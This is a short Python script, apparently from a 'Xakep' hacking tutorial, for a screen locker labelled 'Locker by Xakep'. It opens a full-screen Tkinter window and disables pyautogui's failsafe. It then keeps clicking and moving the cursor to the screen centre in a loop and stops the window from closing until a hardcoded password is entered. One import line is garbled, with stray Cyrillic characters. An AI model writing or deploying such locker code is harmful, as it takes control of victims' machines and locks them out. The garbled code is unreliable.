import pyautogui
from tkinter import Tk, Entry, Label
from pyautogu соi import click, moveTo
from time import sleep

def callback(event):
    global k, entry
    if entry.get() == "SR2I203":
        k = True

def on_closing():
    # Click in the center of the screen
    click(width/2, height/2)
    # Move the cursor to the center of the screen
    moveTo(width/2, height/2)
    # Enable full-screen mode
    root.attributes("-fullscreen", True)
    # If the user attempts to close the window from the Task Manager, call on_closing
    root.protocol("WM_DELETE_WINDOW", on_closing)
    # Enable continuous updating of the window
    root.update()
    # Add a key combination that closes the program
    root.bind('<Control-KeyPress-c>', callback)


#--------------------------------------


# Create window
root = Tk()
# Disable protection of the upper left corner of the screen
pyautogui.FAILSAFE = False
# Get window width and height
width = root.winfo_screenwidth()
height = root.winfo_screenheight()
# Set the window title
root.title('From "Xakep" with love')
# Make the window full-screen
root.attributes("-fullscreen", True)
# Create entry field, set its size and location
entry = Entry(root, font=1)
entry.place(width=150, height=50, x=width/2-75, y=height/2-25)
# Create text captions and set their location
label0 = Label(root, text="╚(•⌂•)╝ Locker by Xakep (╯°□°）╯︵ ┻━┻", font=1)
label0.grid(row=0, column=0)
label1 = Label(root, text="Enter password and press Ctrl + C", font='Arial 20')
label1.place(x=width/2-75-130, y=height/2-25-100)
# Enable continuous updates of the window and pause on
root.update()
sleep(0.2)
# Click in the center of the window
click(width/2, height/2)
# Reset the key to zero
k = False
# Continuously check if the right key is entered
# If the right key is entered, call the hooligan function
while not k:
    on_closing()


